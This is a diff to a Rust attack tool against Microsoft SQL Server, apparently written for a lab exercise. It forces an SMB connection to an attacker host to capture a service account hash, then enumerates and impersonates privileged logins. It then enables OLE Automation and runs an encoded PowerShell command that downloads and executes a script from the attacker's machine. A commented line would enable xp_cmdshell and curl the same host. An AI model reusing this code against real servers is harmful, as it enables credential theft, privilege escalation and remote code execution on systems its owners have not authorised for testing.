@@ -70,27 +70,47 @@ async fn main() {
     }
 
     println!("[+] Attempting auth back to get svc account hash...Check Responder!");
-    let mut query: String = String::from("EXEC master..xp_dirtree \"\\\\192.168.49.142\\\\test\"");
-    //execute_query(&mut conn, &query).await;
-
-    println!("[+] Trying to impersonate dbo user...");
-    query = String::from("use msdb; EXECUTE AS USER = 'dbo'");
+    let mut query: String = String::from("EXEC master..xp_dirtree \"\\\\192.168.49.79\\\\test\"");
     execute_query(&mut conn, &query).await;
-    let curr_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
-    if curr_user[0] == "dbo" {
-        println!("[+] Success! Now executing as {}", curr_user[0]);
-    } else {
-        println!("[!] Could not impersonate dbo user");
-        println!("[+] Checking for users that can be impersonated...");
 
-        query = String::from("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'");
-        let impersonate_users: Vec<String> = get_query(&mut conn, &query, true).await.unwrap();
-        println!("--> Users that can be impersonated: {:?}", impersonate_users);
+    println!("[+] Checking for users that can be impersonated...");
+    query = String::from("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'");
+    let impersonate_users: Vec<String> = get_query(&mut conn, &query, true).await.unwrap();
+    println!("--> Users that can be impersonated: {:?}", impersonate_users);
 
-        println!("[+] Trying to impersonate {}", impersonate_users[0]);
-        query = String::from(format!("EXECUTE AS LOGIN = '{}'", impersonate_users[0]));
-        execute_query(&mut conn, &query).await;
+    println!("[+] Trying to impersonate {}", impersonate_users[0]);
+    query = String::from(format!("EXECUTE AS LOGIN = '{}'", impersonate_users[0]));
+    execute_query(&mut conn, &query).await;
+
+    if get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0] != user[0] {
+        println!("[+] Success!");
         println!("--> Now logged in as: {}", get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0]);
+    } else {
+        println!("[!] Could not impersonate user!");
+        println!("[+] Trying to impersonate dbo user...");
+        query = String::from("use msdb; EXECUTE AS USER = 'dbo'");
+        execute_query(&mut conn, &query).await;
+        let curr_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
+        if curr_user[0] == "dbo" {
+            println!("[+] Success! Now executing as {}", curr_user[0]);
+        } else {
+            println!("[!] Could not impersonate dbo user");
+        }
     }
-    
+
+    // println!("[+] Enabling xp_cmdshell");
+    // query = String::from("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
+    // execute_query(&mut conn, &query).await;
+
+    // println!("[+] Executing command 'whoami'");
+    // execute_query(&mut conn, "EXEC xp_cmdshell 'curl http://192.168.49.79/hellooooo'").await;
+    println!("[+] Enabling OLE Automation Procedures");
+    query = String::from("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
+    execute_query(&mut conn, &query).await;
+
+    println!("[+] Executing command");
+    query = String::from("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAOQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==\"'");
+    execute_query(&mut conn, &query).await;
+
+        
 }
